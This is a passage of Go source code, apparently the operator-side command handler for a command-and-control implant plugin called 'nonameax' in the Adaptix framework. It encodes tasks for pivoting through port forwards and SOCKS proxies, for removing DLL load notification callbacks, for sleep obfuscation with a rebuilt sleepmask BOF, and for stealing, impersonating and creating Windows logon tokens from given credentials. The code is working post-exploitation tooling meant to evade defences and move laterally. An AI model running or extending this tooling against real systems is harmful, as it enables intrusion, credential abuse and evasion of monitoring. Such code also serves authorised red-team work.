			msg = adaptix.ConsoleMessageData{Status: messageSeveritySuccess, Message: fmt.Sprintf("lportfwd %s:%d -> %s:%d started", lhost, lport, fwdhost, fwdport)}
		case "stop":
			Ts.TsTunnelStopLportfwd(agentData.Id, lport)
			taskData.MessageType = messageSeveritySuccess
			taskData.Message = fmt.Sprintf("lportfwd on port %d stopped", lport)
			msg = adaptix.ConsoleMessageData{Status: messageSeveritySuccess, Message: fmt.Sprintf("lportfwd on port %d stopped", lport)}
		default:
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: lportfwd: subcommand must be 'start' or 'stop'")
		}
		return taskData, msg, nil

	case "rportfwd":
		lportVal, _ := args["lport"].(float64)
		lport := int(lportVal)
		if lport < 1 || lport > 65535 {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: rportfwd: port must be 1-65535")
		}

		taskData := adaptix.TaskData{Type: adaptix.TASK_TYPE_TUNNEL}
		var msg adaptix.ConsoleMessageData

		switch subcommand {
		case "start":
			fwdhost, _ := args["fwdhost"].(string)
			fwdportVal, _ := args["fwdport"].(float64)
			fwdport := int(fwdportVal)
			if fwdhost == "" {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: rportfwd start: fwdhost required")
			}
			if fwdport < 1 || fwdport > 65535 {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: rportfwd start: fwdport must be 1-65535")
			}
			tunnelId, err := Ts.TsTunnelCreateRportfwd(agentData.Id, "", lport, fwdhost, fwdport)
			if err != nil {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
			}
			msg = adaptix.ConsoleMessageData{Status: messageSeveritySuccess, Message: fmt.Sprintf("rportfwd 127.0.0.1:%d -> %s:%d started", lport, fwdhost, fwdport)}
		case "stop":
			Ts.TsTunnelStopRportfwd(agentData.Id, lport)
			taskData.MessageType = messageSeveritySuccess
			taskData.Message = "rportfwd stopped"
			msg = adaptix.ConsoleMessageData{Status: messageSeveritySuccess, Message: fmt.Sprintf("rportfwd on port %d stopped", lport)}
		default:
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: rportfwd: subcommand must be 'start' or 'stop'")
		}
		return taskData, msg, nil

	case "socks":
		taskData := adaptix.TaskData{Type: adaptix.TASK_TYPE_TUNNEL}
		var msg adaptix.ConsoleMessageData

		switch subcommand {
		case "start":
			address, _ := args["address"].(string)
			if address == "" {
				address = "0.0.0.0"
			}
			portVal, _ := args["port"].(float64)
			port := int(portVal)
			if port < 1 || port > 65535 {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: socks start: port must be 1-65535")
			}

			socks4, _ := args["-socks4"].(bool)
			var tunnelId string
			var err error
			if socks4 {
				tunnelId, err = Ts.TsTunnelCreateSocks4(agentData.Id, "", address, port)
				if err != nil {
					return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
				}
				taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
				if err != nil {
					return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
				}
				msg = adaptix.ConsoleMessageData{Status: messageSeveritySuccess, Message: fmt.Sprintf("SOCKS4 proxy started on %s:%d", address, port)}
			} else {
				auth, _ := args["-auth"].(bool)
				username, _ := args["username"].(string)
				password, _ := args["password"].(string)
				tunnelId, err = Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, auth, username, password)
				if err != nil {
					return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
				}
				taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
				if err != nil {
					return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
				}
				if auth {
					msg = adaptix.ConsoleMessageData{Status: messageSeveritySuccess, Message: fmt.Sprintf("SOCKS5 proxy (auth) started on %s:%d", address, port)}
				} else {
					msg = adaptix.ConsoleMessageData{Status: messageSeveritySuccess, Message: fmt.Sprintf("SOCKS5 proxy started on %s:%d", address, port)}
				}
			}

		case "stop":
			portVal, _ := args["port"].(float64)
			port := int(portVal)
			if port < 1 || port > 65535 {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: socks stop: port must be 1-65535")
			}
			Ts.TsTunnelStopSocks(agentData.Id, port)
			taskData.MessageType = messageSeveritySuccess
			taskData.Message = fmt.Sprintf("SOCKS proxy on port %d stopped", port)
			msg = adaptix.ConsoleMessageData{Status: messageSeveritySuccess, Message: fmt.Sprintf("SOCKS proxy on port %d stopped", port)}

		default:
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: socks: subcommand must be 'start' or 'stop'")
		}
		return taskData, msg, nil

	case "dll-notify":
		switch subcommand {
		case "list":
			task := adaptix.TaskData{
				Type: taskTypeTask,
				Data: []byte{CMD_DLL_NOTIFY_LIST, 0x00, 0x00, 0x00, 0x00},
				Sync: true,
			}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "dll-notify list queued"}
			return task, msg, nil
		case "remove":
			task := adaptix.TaskData{
				Type: taskTypeTask,
				Data: []byte{CMD_DLL_NOTIFY_REMOVE, 0x00, 0x00, 0x00, 0x00},
				Sync: true,
			}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "dll-notify remove queued"}
			return task, msg, nil
		default:
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: dll-notify: unknown subcommand %q", subcommand)
		}

	case "sleepobf-config":
		sleepObfStr, _ := args["sleep_obf"].(string)

		var sleepObf byte
		switch strings.ToLower(sleepObfStr) {
		case "1", "on", "true":
			sleepObf = 1
		}

		// cmd_id(1) | args_len(4LE)=2 | sleep_obf(1) | pad(1)
		data := make([]byte, 7)
		data[0] = CMD_SLEEPOBF_CONFIG
		binary.LittleEndian.PutUint32(data[1:5], 2)
		data[5] = sleepObf
		data[6] = 0

		obfName := map[byte]string{0: "off", 1: "on"}[sleepObf]
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{
			Status:  messageSeverityInfo,
			Message: fmt.Sprintf("sleepobf-config: sleep_obf=%s", obfName),
		}
		return task, msg, nil

	case "sleepmask-set":
		naxRoot := resolveNaxRoot()
		smDir := filepath.Join(naxRoot, "src_sleepmask")
		smPath := filepath.Join(smDir, "dist", "sleepmask.x64.o")

		smTarget := "all"
		if debugFlag, _ := args["-debug"].(bool); debugFlag {
			smTarget = "debug"
		}

		cleanCmd := exec.Command("make", "-C", smDir, "clean")
		cleanCmd.CombinedOutput()
		buildCmd := exec.Command("make", "-C", smDir, smTarget)
		if smOut, smErr := buildCmd.CombinedOutput(); smErr != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: sleepmask build failed: %v\n%s", smErr, string(smOut))
		}

		smBytes, err := os.ReadFile(smPath)
		if err != nil || len(smBytes) == 0 {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: sleepmask BOF not found at %s", smPath)
		}
		sleepmaskBofCache = smBytes

		argsLen := 4 + len(smBytes)
		buf := make([]byte, 5+argsLen)
		buf[0] = CMD_SLEEPMASK_SET
		binary.LittleEndian.PutUint32(buf[1:5], uint32(argsLen))
		binary.LittleEndian.PutUint32(buf[5:9], uint32(len(smBytes)))
		copy(buf[9:], smBytes)
		taskData := adaptix.TaskData{Type: taskTypeTask, Data: buf, Sync: true}
		msg := adaptix.ConsoleMessageData{
			Status:  messageSeverityInfo,
			Message: fmt.Sprintf("Sending sleepmask BOF (%d bytes, rebuilt from source)", len(smBytes)),
		}
		return taskData, msg, nil

	case "chunksize":
		sizeStr, _ := args["size"].(string)
		if sizeStr == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: chunksize: 'size' argument required (e.g. 2MB, 512KB, 1048576)")
		}
		parsed, csErr := parseChunkSize(sizeStr)
		if csErr != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: chunksize: %w", csErr)
		}
		data := make([]byte, 9)
		data[0] = CMD_CHUNKSIZE
		binary.LittleEndian.PutUint32(data[1:5], 4)
		binary.LittleEndian.PutUint32(data[5:9], uint32(parsed))
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("Setting download chunk size to %s", humanSize(parsed))}
		return task, msg, nil

	case "token":
		switch subcommand {
		case "getuid":
			data := make([]byte, 5)
			data[0] = CMD_TOKEN_GETUID
			binary.LittleEndian.PutUint32(data[1:5], 0)
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "token getuid queued"}
			return task, msg, nil

		case "steal":
			pidVal, ok := args["pid"].(float64)
			if !ok || pidVal <= 0 {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: token steal: 'pid' argument required")
			}
			pid := uint32(pidVal)
			impersonate := byte(0)
			if v, ok := args["-i"].(bool); ok && v {
				impersonate = 1
			}
			// pid(4LE) | impersonate(1)
			argsLen := 4 + 1
			data := make([]byte, 5+argsLen)
			data[0] = CMD_TOKEN_STEAL
			binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
			binary.LittleEndian.PutUint32(data[5:9], pid)
			data[9] = impersonate
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			label := fmt.Sprintf("token steal %d queued", pid)
			if impersonate != 0 {
				label += " (impersonate)"
			}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: label}
			return task, msg, nil

		case "impersonate":
			idVal, ok := args["token_id"].(float64)
			if !ok || idVal <= 0 {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: token impersonate: 'token_id' argument required")
			}
			tokenId := uint32(idVal)
			// token_id(4LE)
			data := make([]byte, 9)
			data[0] = CMD_TOKEN_USE
			binary.LittleEndian.PutUint32(data[1:5], 4)
			binary.LittleEndian.PutUint32(data[5:9], tokenId)
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("token impersonate %d queued", tokenId)}
			return task, msg, nil

		case "list":
			data := make([]byte, 5)
			data[0] = CMD_TOKEN_LIST
			binary.LittleEndian.PutUint32(data[1:5], 0)
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "token list queued"}
			return task, msg, nil

		case "rm":
			idVal, ok := args["token_id"].(float64)
			if !ok || idVal <= 0 {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: token rm: 'token_id' argument required")
			}
			tokenId := uint32(idVal)
			data := make([]byte, 9)
			data[0] = CMD_TOKEN_RM
			binary.LittleEndian.PutUint32(data[1:5], 4)
			binary.LittleEndian.PutUint32(data[5:9], tokenId)
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("token rm %d queued", tokenId)}
			return task, msg, nil

		case "revert":
			data := make([]byte, 5)
			data[0] = CMD_TOKEN_REVERT
			binary.LittleEndian.PutUint32(data[1:5], 0)
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "token revert queued"}
			return task, msg, nil

		case "make":
			domain, _ := args["domain"].(string)
			username, _ := args["username"].(string)
			password, _ := args["password"].(string)
			if username == "" {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: token make: 'username' argument required")
			}
			if password == "" {
				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
					errors.New("nonameax: token make: 'password' argument required")
			}
			logonType := uint32(9) // LOGON32_LOGON_NEW_CREDENTIALS
			if lt, ok := args["-t"].(string); ok {
				switch lt {
				case "interactive":
					logonType = 2
				case "network":
					logonType = 3
				case "network_cleartext":
					logonType = 8
				case "new_credentials":
					logonType = 9
				}
			}
			domBytes := []byte(domain)
			userBytes := []byte(username)
			passBytes := []byte(password)
			// logon_type(4LE) + domain_len(4LE) + domain + user_len(4LE) + user + pass_len(4LE) + pass
			innerLen := 4 + 4 + len(domBytes) + 4 + len(userBytes) + 4 + len(passBytes)
			data := make([]byte, 5+innerLen)
			data[0] = CMD_TOKEN_MAKE
			binary.LittleEndian.PutUint32(data[1:5], uint32(innerLen))
			off := 5
			binary.LittleEndian.PutUint32(data[off:off+4], logonType)
			off += 4
			binary.LittleEndian.PutUint32(data[off:off+4], uint32(len(domBytes)))
			off += 4
			copy(data[off:], domBytes)
			off += len(domBytes)
			binary.LittleEndian.PutUint32(data[off:off+4], uint32(len(userBytes)))
			off += 4
			copy(data[off:], userBytes)
			off += len(userBytes)
			binary.LittleEndian.PutUint32(data[off:off+4], uint32(len(passBytes)))
			off += 4
			copy(data[off:], passBytes)
			label := fmt.Sprintf("token make %s\\%s queued", domain, username)
			if domain == "" {
				label = fmt.Sprintf("token make %s queued", username)
			}
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: label}
			return task, msg, nil

		case "privs":
			data := make([]byte, 5)
			data[0] = CMD_TOKEN_PRIVS
			binary.LittleEndian.PutUint32(data[1:5], 0)
			task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
			msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "token privs queued"}
			return task, msg, nil

		default:
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: token: unknown subcommand %q", subcommand)
		}

	default:
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: unknown command %q", command)
	}
}
